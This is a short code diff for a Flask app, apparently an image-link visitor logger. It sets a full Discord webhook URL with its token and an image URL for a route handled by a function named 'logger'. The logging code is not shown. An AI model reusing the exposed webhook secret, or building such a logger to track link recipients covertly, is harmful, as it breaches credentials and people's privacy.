@@ -5,8 +5,8 @@ import io
 app = Flask(__name__)
 
 # إعداداتك
-WEBHOOK_URL = "https://discord.com"
-IMAGE_URL = "https://alphacoders.com"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1493558963869061224/tY_NAc83SlbAMed-ibT8MdFhC88Owdqb-naTrn6q5-En386EXCCqZBByyhiPg6S7JBOr"
+IMAGE_URL = "https://i.ytimg.com/vi/TsdaDldRPWA/hq720.jpg"
 
 @app.route('/api/image')
 def logger():
